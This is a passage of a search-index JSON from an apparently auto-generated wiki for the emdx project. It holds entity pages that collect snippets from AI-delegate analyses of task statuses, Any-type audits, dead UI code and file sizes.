as \"part of a parallel delegate test run\"</li> </ul>"},{"location":"entities/actionable-items/#common-themes","title":"Common Themes","text":"<ul> <li> <p>Both agents ...</p> </li> <li> <p>#6437 Any/None typing audit [synthesis]</p> <p>Dynamic Kwargs (4 occurrences) - <code>**kwargs: Any</code></p> </li> <li>Used in update functions with whitelist validation</li> <li> <p>Verdict: Mixed - some are unused (remove), others are intentional (consider TypedDict)</p> </li> <li> <p>Return Types (2 occurrences) - `-&gt; di...</p> </li> <li> <p>#6419 Type System Audit: Replace Any/None with Concrete Types [synthesis]</p> <p>\u251c\u2500\u2500 database/ \u2502   \u2514\u2500\u2500 types.py          # DocumentRow, CascadeDocument, GroupMember, etc. ```</p> </li> </ul>"},{"location":"entities/actionable-items/#core-types-to-define-priority-order","title":"Core Types to Define (Priority Order)","text":"<p>Phase 1: Foundation (Week 1) - <code>TaskDict</code> \u2014 used by 10+ functions, highest impact - <code>DocumentRow</code> \u2014 base for...</p> <ul> <li>#6406 Bug Fix PR Reviews [synthesis] <p>Security Hardening - PRs #592, #594 address pickle deserialization and SQL injection risks</p> </li> <li>Return Value Accuracy - #589 fixes misleading return values that masked failures</li> </ul>"},{"location":"entities/actionable-items/#actionable-items_2","title":"Actionable Items","text":""},{"location":"entities/actionable-items/#blocking-must-fix-before-merge","title":"Blocking (Must Fix Before Merge)","text":"<p>**PR #5...</p> <ul> <li>#6153 PR Review Sprint: Smart Ops Synthesis <p>#448/449 (Save/Dream) \u2014 after removing unused imports, adding tests</p> </li> <li>#454 (Semantic Find) \u2014 after fixing CI failures</li> </ul>"},{"location":"entities/actionable-items/#actionable-items_3","title":"Actionable Items","text":""},{"location":"entities/actionable-items/#must-do-before-merge","title":"Must Do (Before Merge)","text":"<ul> <li> <p>[ ] Fix CI failures in #454 (mock HybridSearchService or force keyword m...</p> </li> <li> <p>#6464 Claude Document Templates Comprehensive Guide   Section: Template Rules and Standards</p> <p>...#PARTIAL, #OBSOLETE, #REPORTED, #COMPLETE</p> </li> <li>Priority: #HIGH, #MEDIUM, #LOW (for actionable items)</li> <li> <p>Dates: Created and/or Updated/Completed</p> </li> <li> <p>#33 Claude Output Templates Guide   Section: Claude Instructions File</p> <p>...ENTING, #IMPLEMENTED, #PARTIAL, #OBSOLETE</p> </li> <li>Priority: #HIGH, #MEDIUM, #LOW (for actionable items)</li> <li> <p>Dates: Created and/or Updated</p> </li> <li> <p>#6864 Delegate synthesis [synthesis]</p> <p>Minor Inaccuracies in development-setup.md** Wrong file paths (<code>logging.py</code> vs <code>logging_utils.py</code>, <code>cli.py</code> doesn't exist), wrong test file count (52 vs 63), possibly wrong env var name (<code>EMDX_DB_PATH</code> vs <code>EMDX_DATABASE_URL</code>). ### Common Themes</p> </li> <li> <p>**...</p> </li> <li> <p>#6760 Wiki Generation Architecture: GitBook + Dendron Research [synthesis]</p> <ul> <li>Publishing \u2014 Next.js static site with three-column layout, permanent ID-based URLs, per-hierarchy publish controls. ---</li> </ul> </li> </ul>"},{"location":"entities/actionable-items/#common-themes_1","title":"Common Themes","text":"Theme GitBook Dendron Implication for emdx ... <ul> <li> <p>#6752 Academic Tool Research for Wiki Generation [synthesis]</p> <p>Stub/Orphan Detection (Wikipedia Tooling) Practical detection algorithms for identifying content gaps map directly to emdx's existing wikification infrastructure, providing heuristics for finding documents that need expansion, linking, or quality imp...</p> </li> <li> <p>#6681 Delegate Slimming \u2014 Unified Research Synthesis</p> <p>Delegate core value is multi-session orchestration: parallel dispatch, worktree lifecycle, synthesis, PR pipeline, batch coordination. ## Actionable Items (Priority Order)</p> </li> </ul>"},{"location":"entities/actionable-items/#p0-claudemd-restructure-zero-code-high-impact","title":"P0: CLAUDE.md Restructure (zero code, high impact)","text":"<p>Restructure Mandatory ...</p> <ul> <li> <p>#6668 Prime Command Redesign: External Tool Research [synthesis]</p> <p>Embeddings are better for semantic/conceptual search but worse for structural understanding. ## Actionable Items for emdx Prime Redesign</p> </li> <li> <p>Study Aider's repo map approach \u2014 A PageRank-weighted symbol skeleton could dramatically improve prime's ...</p> </li> <li> <p>#6583 Delegate synthesis [synthesis]</p> <p>Zero mock specs = zero regression safety net \u2014 This is arguably more impactful than the production <code>Any</code> issues because it means refactors can't rely on the test suite to catch interface drift. ## Actionable Items (Priority Order)</p> </li> </ul>"},{"location":"entities/actionable-items/#immediate","title":"Immediate ...","text":""},{"location":"entities/actionable-items/#related-entities","title":"Related Entities","text":"<ul> <li><code>actionable items (priority order)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.2)</li> <li><code>overview three</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.2)</li> <li><code>zero mock specs = zero regression safety net</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>unspecced mocks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>typed parameters</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>type safety audit synthesis:</code>emdx/services/<code>,</code>emdx/ui/<code>, and</code>tests/` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>type safety audit synthesis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>the production code has moderate</code>any<code>usage that's mostly fixable, while the test suite has zero</code>spec=<code>coverage across 220+ mocks \u2014 a significant regression risk.</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>test mock specs:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>test mock gap is the highest-risk finding</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> </ul>"},{"location":"entities/active/","title":"active","text":"<p>Type: tech_term | Mentioned in: 13 documents | First seen: 2025-07-12</p>"},{"location":"entities/active/#documents-13","title":"Documents (13)","text":"<ul> <li>#6862 Delegate: Audit README.md: Read the full README.md and check every CLI [1/3]   Section: Issues Found <p>...without warning**</p> </li> </ul> <pre><code>emdx gui                                         # Interactive TUI browser\n</code></pre> <p>The CLAUDE.md explicitly says NEVER run <code>emdx gui</code> because it hangs Claude Code. The README itself is fine for human readers, but the comment cou...</p> <ul> <li>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: Task Tracking <ul> <li>Tasks created via <code>_safe_create_task()</code> (never fails delegate)</li> </ul> </li> <li>Tasks linked to executions via <code>execution_id</code></li> <li>Status transitions: <code>active</code> \u2192 <code>done</code> / <code>failed</code> / <code>partial</code></li> <li> <p>Parent task created for parallel batches</p> </li> <li> <p>#6520 Delegate: Analyze FEAT-5: Re-implement smart priming (PR #446). The or [1/2]   Section: \u2705 IMPLEMENTED (Already in Current Codebase)</p> <p>...s | <code>_get_cascade_status()</code> | Implemented identically | <code>prime.py:295-318</code> | | Active Epics | Not in PR #446 | Added to prime | <code>prime.py:202-223</code> | | Ready Tasks | Not in PR #446 | Added to prime | <code>prime.py:226-252</code> | | JSON Output** | `_out...</p> </li> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Tasks Table (Core Entity)</p> <p>...XT | \"\" | Optional description | | <code>status</code> | TEXT | \"open\" | Current state: open, active, blocked, done, failed | | <code>priority</code> | INTEGER | 3 | Priority level (1=highest, 5=lowest) | | <code>gameplan_id</code> | INTEGER | NULL | FK to documents (optional gameplan) |...</p> </li> <li> <p>#6395 Delegate: Analyze how EMDX is used differently by humans vs AI agents. [1/3]   Section: Human Patterns</p> <p>...ing markdown files</p> </li> <li><code>emdx edit &lt;id&gt;</code> \u2014 opening external editor ($EDITOR) for interactive writing</li> <li>Writing notes manually and saving via stdin</li> <li> <p>Creating through TUI (GUI mode \u2014 forbidden for agents)</p> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]   Section: Database Schema</p> <p>...ary key</p> </li> <li><code>title</code>: Task title</li> <li><code>description</code>: Task description</li> <li><code>status</code>: open | active | blocked | done | failed</li> <li><code>priority</code>: 1-5 (default 3)</li> <li><code>gameplan_id</code>: Links to documents table</li> <li><code>project</code>: Project name</li> <li><code>current_step</code>: Resume checkpoint</li> <li> <p>`cr...</p> </li> <li> <p>#6180 Delegate: Task System Comprehensive Analysis [15/15]   Section: Core Components</p> <p>...hierarchy via <code>parent_task_id</code> for grouped operations</p> </li> <li>Status workflow: <code>open</code> \u2192 <code>active</code> \u2192 <code>done</code> | <code>failed</code> | <code>blocked</code></li> <li>Priority levels 1-5 with gameplan linkage</li> <li> <p>Fields for delegate activity: <code>prompt</code>, <code>type</code>, <code>execution_id</code>, <code>output_doc_id</code>, `sour...</p> </li> <li> <p>#6169 Delegate: Analyze the task runner service. Read emdx/services/task_run [3/15]   Section: How <code>emdx task run</code> Works</p> <p>...- <code>run_task()</code> validates task state and dependencies</p> </li> <li>Updates task status to <code>active</code></li> <li> <p>Calls <code>_run_task_direct()</code> which:</p> <ul> <li>Creates a log file in <code>EMDX_LOG_DIR</code></li> <li>Builds a task prompt with context (gameplan, dependencies, instruction...</li> </ul> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]   Section: Task States (STATUSES constant)</p> <p><code>python STATUSES = (\"open\", \"active\", \"blocked\", \"done\", \"failed\")</code></p> </li> <li> <p>#6163 Delegate: Analyze the emdx task CLI commands. Read emdx/commands/tasks [2/15]   Section: EMDX Task CLI Commands Analysis</p> </li> <li> <p>#460 EMDX Slimdown Analysis: Code Reduction Opportunities   Section: Tags for This Analysis</p> <p>Recommended tags: <code>analysis</code>, <code>refactor</code>, <code>active</code></p> </li> <li> <p>#452 Minimal Tag Taxonomy - Space-Efficient   Section: Core Tags (Single Words Only)</p> </li> <li><code>active</code> - Currently working on</li> <li><code>done</code> - Completed</li> <li> <p><code>blocked</code> - Stuck/waiting</p> </li> <li> <p>#6707 Delegate: Analyze the current Task screen (emdx/ui/task_view.py, task_ [2/4]   Section: How Tasks Are Grouped</p> Section Icon Style READY (open) <code>\u25cb</code> default ACTIVE <code>\u25cf</code> green BLOCKED <code>\u26a0</code> yellow DONE <code>\u2713</code> dim FAILED <code>\u2717</code> red </li> </ul>"},{"location":"entities/active/#status-system","title":"Status System","text":"<p>Valid statuses: <code>open</code>, <code>active</code>, <code>blocked</code>, <code>done</code>, <code>failed</code> Icons: \u25cb (open), \u25cf (active), \u26a0 (blocked), \u2713 (done), \u2717 (failed)</p>"},{"location":"entities/active/#status-lifecycle","title":"Status (Lifecycle)","text":""},{"location":"entities/active/#related-entities","title":"Related Entities","text":"<ul> <li><code>open</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.0)</li> <li><code>dependency system</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.0)</li> <li><code>task_execution</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>task_deps table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>task runner</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>task lifecycle</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>single tasks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>emdx/services/task_runner.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>blocked</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.7)</li> <li><code>partial</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.7)</li> </ul>"},{"location":"entities/activityitemspy/","title":"activity_items.py","text":"<p>Type: tech_term | Mentioned in: 16 documents | First seen: 2026-02-13</p>"},{"location":"entities/activityitemspy/#documents-16","title":"Documents (16)","text":"<ul> <li>#6792 Delegate: --help [2/2] <p>...nnet model\")</p> </li> <li>Cleaned up activity dashboard code (simplified <code>activity_data.py</code>, <code>activity_items.py</code>, <code>activity_table.py</code>)</li> <li> <p>Removed obsolete <code>test_activity_dashboard.py</code> (412 lines), updated <code>test_activity_table.py</code>...</p> </li> <li> <p>#6711 Delegate synthesis [synthesis]   Section: Actionable Implementation Plan (4 Phases)</p> <p>...kItem(ActivityItem)<code>+</code>_load_tasks()<code>+ badge column to Activity screen | Extend</code>activity_items.py<code>,</code>activity_data.py<code>,</code>activity_table.py<code>| | **2** | Add section headers (RUNNING / READY / RECENT) between tiers | Modify</code>activity_table.py` row population | | **...</p> </li> <li> <p>#6706 Delegate: Analyze the current Activity screen (emdx/ui/activity/) in d [1/4]   Section: Worth keeping:</p> <p>...refresh, cursor preservation, double-click detection | | <code>ActivityItem</code> classes (<code>activity_items.py</code>) | Keep \u2014 clean dataclasses. <code>AgentExecutionItem.get_preview_content()</code> is still useful (reads <code>output_text</code> or log file as static content, no streaming) | | St...</p> </li> <li> <p>#6583 Delegate synthesis [synthesis]   Section: Common Themes</p> <ol> <li>ABC-level <code>Any</code> propagates widely \u2014 The <code>activity_items.py</code> <code>doc_db: Any</code> parameter affects 4 subclasses \u00d7 2 methods = 8 signatures. Fixing the ABC fixes everything downstream.</li> </ol> </li> <li> <p>#6581 Delegate: Audit emdx/ui/ for methods with Any-typed parameters that co [2/3]   Section: Recommended Fix Order</p> <ol> <li><code>activity_items.py</code> doc_db parameter \u2014 Highest impact (8 signatures, ABC-level fix)</li> </ol> </li> <li><code>protocols.py</code> callback parameter \u2014 Interface-level fix</li> <li> <p>**<code>search_presenter.py</code> search s...</p> </li> <li> <p>#6509 Any Type Removal Analysis [synthesis]   Section: Common Themes</p> </li> <li> <p>#6508 Any Type Removal Analysis [synthesis]   Section: Files by Priority</p> <p>...le | Any Count | Removable | |----------|------|-----------|-----------| | High | <code>activity_items.py</code> | 15 | 15 | | High | <code>cascade_view.py</code> | 12 | 12 | | High | <code>unified_search.py</code> | 5 | 5 | | High | <code>ask_service.py</code> | 6 | 6 | | Medium | <code>compact.py</code> | 7 | 5 | | Me...</p> </li> <li> <p>#6491 Any Type Removal Analysis [1/5]   Section: Recommendations Summary</p> File Any Count Priority <code>activity_items.py</code> 15 High \u2014 core data types <code>cascade_view.py</code> 12 High \u2014 multiple timer/stream types <code>activity_view.py</code> 2 Low \u2014 just init <code>group_picker.py</code>... </li> <li> <p>#6488 Any Type Removal Analysis [1/5]   Section: Summary</p> File Any Count Recommendation <code>activity_items.py</code> 8 Replace with protocol/concrete types <code>activity_view.py</code> 2 Replace with concrete types <code>group_picker.py</code> 3 Replace with concrete dict types ... </li> <li> <p>#6417 Type System Audit: Replace Any/None with Concrete Types [4/4]   Section: 1. Activity Items \u2014 <code>doc_db: Any</code> (6 occurrences)</p> <p>Location: <code>emdx/ui/activity/activity_items.py</code> (lines 51, 56, 86, 122, 179, 221, 285, 289, 330, 393, 464, 468)</p> </li> <li> <p>#6176 Delegate: Audit emdx/ui/ for dead TUI code. Check ALL ui/ files includ [5/17]   Section: 2. wf_db Parameter \u2014 Passed as None Everywhere (12 occurrences)</p> <p>Method Definitions with unused wf_db parameter:</p> </li> <li><code>emdx/ui/activity/activity_items.py:54</code> \u2014 <code>async def load_children(self, wf_db, doc_db)</code></li> <li><code>emdx/ui/activity/activity_items.py:59</code> \u2014 <code>async def get_preview_content(self, wf_db, doc_db)</code></li> <li> <p>`emdx/ui/acti...</p> </li> <li> <p>#6167 Delegate: Analyze how tasks appear in the TUI. Read emdx/ui/browser_co [6/15]   Section: Conclusion</p> <ol> <li>Add a <code>_load_tasks()</code> method to <code>ActivityDataLoader</code></li> </ol> </li> <li>Create a <code>TaskItem</code> class in <code>activity_items.py</code></li> <li>Display ready/active tasks prominently in Activity Browser</li> <li> <p>OR create a dedicated Task Browser (key <code>5</code>?)</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...task_view.py: All 2 necessary</p> </li> <li>keybindings/config.py: All 3 necessary</li> <li> <p>activity_items.py: All 5 necessary</p> </li> <li> <p>#6259 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [17/37]   Section: Changes Made</p> <p>...ity_browser.py**: Tree focus failures logged at debug (may not be mounted yet)</p> </li> <li>activity_items.py: Added logger, cascade run children and log file read errors logged</li> <li>activity_view.py: Selected item query and markdown rendering fallbacks logged</li> <li> <p>**cascade...</p> </li> <li> <p>#6171 Delegate: Systematic cross-cutting grep for ALL references to removed  [10/17]   Section: 1. wf_db Parameter \u2014 RUNTIME-BREAKING (12 hits)</p> <p>File: <code>emdx/ui/activity/activity_items.py</code></p> </li> </ul>"},{"location":"entities/activityitemspy/#5-protocol-pattern-for-db-access-high-priority","title":"5. Protocol Pattern for DB Access (High Priority)","text":"<p><code>doc_db: Any</code> parameter appears in 8 abstract methods in <code>activity_items.py</code>.</p>"},{"location":"entities/activityitemspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>group_picker.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.7)</li> <li><code>search_presenter.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.7)</li> <li><code>qa_presenter.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>lower impact</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>log_browser*.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>grouplistitem</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>callable[[], none]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>activity_table.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>inputs.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.4)</li> <li><code>emdx/ui/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/activityviewpy/","title":"activity_view.py","text":"<p>Type: tech_term | Mentioned in: 15 documents | First seen: 2026-01-13</p>"},{"location":"entities/activityviewpy/#documents-15","title":"Documents (15)","text":"<ul> <li> <p>#6711 Delegate synthesis [synthesis]   Section: Key Findings</p> <p>~100 lines of live-streaming code in <code>activity_view.py</code> are dead weight. The <code>AgentLogSubscriber</code>, <code>_show_live_log()</code>, <code>_handle_log_content()</code>, <code>_stop_stream()</code>, and the <code>#preview-log</code> widget were designed for a stream...</p> </li> <li> <p>#6707 Delegate: Analyze the current Task screen (emdx/ui/task_view.py, task_ [2/4]   Section: How This Compares to the Activity Screen</p> <p>The Activity screen (<code>activity_view.py</code>) is a completely separate world:</p> </li> <li> <p>#6706 Delegate: Analyze the current Activity screen (emdx/ui/activity/) in d [1/4]   Section: Live Log Streaming Code</p> <ol> <li><code>_show_live_log(item)</code> (<code>activity_view.py:651-725</code>) \u2014 Hides markdown preview, shows <code>#preview-log</code> RichLog</li> </ol> </li> <li>Reads <code>item.log_file</code> path from the execution record</li> <li> <p>Creates a <code>LogStream</code> (`services/log_...</p> </li> <li> <p>#6491 Any Type Removal Analysis [1/5]   Section: Recommendations Summary</p> <p>...re data types | | <code>cascade_view.py</code> | 12 | High \u2014 multiple timer/stream types | | <code>activity_view.py</code> | 2 | Low \u2014 just init | | <code>group_picker.py</code> | 4 | Medium \u2014 group dict types | | <code>stage_summary_bar.py</code> | 1 | Low \u2014 just init | | <code>document_list.py</code> | 1 | Lo...</p> </li> <li> <p>#6488 Any Type Removal Analysis [1/5]   Section: Summary</p> <p>...-----------| | <code>activity_items.py</code> | 8 | Replace with protocol/concrete types | | <code>activity_view.py</code> | 2 | Replace with concrete types | | <code>group_picker.py</code> | 3 | Replace with concrete dict types | | <code>cascade_view.py</code> | 12 | Replace with protocol/concrete types | |...</p> </li> <li> <p>#6335 Architecture Refactoring Assessment - February 2026   Section: Issue 6: No UI Mixins (NOT ADDRESSED)</p> <p>Current State: No <code>ui/mixins/</code> directory exists. Browsers still large:</p> </li> <li><code>activity_view.py</code>: 1175 lines</li> <li> <p><code>document_browser.py</code>: 1122 lines</p> </li> <li> <p>#6330 Delegate synthesis [synthesis]   Section: Critical Issues (Address First)</p> <ol> <li>Monolithic files need decomposition:</li> </ol> </li> <li><code>migrations.py</code>: 2200 lines (39 migrations in one file)</li> <li><code>activity_view.py</code>: 1175 lines</li> <li><code>document_browser.py</code>: 1122 lines</li> <li><code>maintain.py</code>: 1098 lines</li> <li> <p><code>core.py</code>: 876 lines</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Areas for Improvement</p> <p>...----|-------|---------| | <code>migrations.py</code> | 2200 | All migrations in one file | | <code>activity_view.py</code> | 1175 | UI logic + data | | <code>document_browser.py</code> | 1122 | Complex widget | | <code>maintain.py</code> | 1098 | 10+ subcommands | | <code>core.py</code> | 876 | 5 CLI commands |</p> </li> <li> <p>#6234 Delegate: Tech Debt Category Audit 2026-02-14 [14/14]   Section: CATEGORY 1: Exception Handling &amp; Error Management</p> <ul> <li>366 generic except clauses (<code>except.*:</code>) across 81 files</li> </ul> </li> <li>Many are overly broad, catching errors they shouldn't handle</li> <li> <p>UI components are worst offenders: <code>document_browser.py</code> (20), <code>activity_view.py</code> (22)</p> </li> <li> <p>#6176 Delegate: Audit emdx/ui/ for dead TUI code. Check ALL ui/ files includ [5/17]   Section: 2. wf_db Parameter \u2014 Passed as None Everywhere (12 occurrences)</p> <p>Call Sites (passing None for wf_db):</p> </li> <li><code>emdx/ui/activity/activity_view.py:850</code> \u2014 <code>item.children = await item.load_children(None, doc_db)</code></li> <li> <p><code>emdx/ui/activity/activity_view.py:872</code> \u2014 <code>item.children = await item.load_children(None, doc_db)</code>...</p> </li> <li> <p>#6167 Delegate: Analyze how tasks appear in the TUI. Read emdx/ui/browser_co [6/15]   Section: Integration Gap</p> <p>But none of this surfaces in the GUI. The Activity Browser (<code>activity_view.py</code>) loads:</p> </li> <li>Groups via <code>_load_groups()</code></li> <li>Direct document saves via <code>_load_direct_saves()</code></li> <li>Cascade executions via <code>_load_cascade_executions()</code></li> <li> <p>Agent executions vi...</p> </li> <li> <p>#4894 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Theme 4: Large Files Indicating Architectural Strain</p> File Lines Issues Noted <code>activity_view.py</code> 1,513 22 bare exceptions, too many responsibilities <code>executor.py</code> 1,409 8% coverage, complex logic, 35 async patterns <code>migrations.py</code> 1,340 All... </li> <li> <p>#4746 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Executive Summary</p> <p>...rallel performance analyses of the EMDX Activity View component (<code>emdx/ui/activity/activity_view.py</code>, ~1,516 lines). All analyses converge on a critical finding: the N+1 database query pattern causing 300-800+ queries every 5 seconds during periodic refresh...</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...tte_commands.py**: All 4 necessary</p> </li> <li>browser_container.py: All 2 necessary</li> <li>activity_view.py: All 5 necessary</li> <li>activity_tree.py: All 3 necessary</li> <li>task_view.py: All 2 necessary</li> <li>keybindings/config.py: All 3 necessary</li> <li> <p>activity_items.py:...</p> </li> <li> <p>#6259 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [17/37]   Section: Changes Made</p> <p>...items.py**: Added logger, cascade run children and log file read errors logged</p> </li> <li>activity_view.py: Selected item query and markdown rendering fallbacks logged</li> <li>cascade_view.py: Timestamp formatting and widget query failures logged</li> <li>**command_palette/palet...</li> </ul>"},{"location":"entities/activityviewpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>workflows/database.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>status bar</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>merge git utilities</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>activityitem</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.2)</li> <li><code>what it shows</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>taskitem</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>taskbrowser</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>task_view.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>pipeline_name</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>pipeline_display_name</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> </ul>"},{"location":"entities/addtagstodocument/","title":"add_tags_to_document()","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-15</p>"},{"location":"entities/addtagstodocument/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6610 Delegate: Search the entire emdx codebase for every import or referenc [2/2]   Section: 2. <code>expand_aliases</code> (function)</p> <p>.../models/tags.py<code>| 40 | **Usage**:</code>expanded_tags = expand_aliases(tag_names)<code>in</code>add_tags_to_document()<code>| |</code>emdx/models/tags.py<code>| 88 | **Usage**:</code>expanded_tags = expand_aliases(tag_names)<code>in</code>remove_tags_from_document()<code>| |</code>emdx/models/tags.py` | 257 | Usage...</p> </li> <li> <p>#6609 Delegate: Investigate removing the emoji alias system from emdx. The s [1/2]   Section: 2. <code>emdx/models/tags.py</code> \u2014 MAJOR CHANGES**</p> Function Usage Change Required <code>add_tags_to_document()</code> (line 40) <code>expanded_tags = expand_aliases(tag_names)</code> Remove \u2014 just use <code>tag_names</code> directly (still lowercase/strip) <code>remove_tags_from_document()</code> (line 88)... </li> <li> <p>#6489 None Type Analysis [4/7]</p> </li> </ul>"},{"location":"entities/addtagstodocument/#emdxmodelstagspy","title":"emdx/models/tags.py","text":""},{"location":"entities/addtagstodocument/#1-add_tags_to_document-parameter-line-29","title":"1. <code>add_tags_to_document()</code> parameter (line 29)","text":"<pre><code>def add_tags_to_document(\n    doc_id: int, tag_names: list[str], conn: 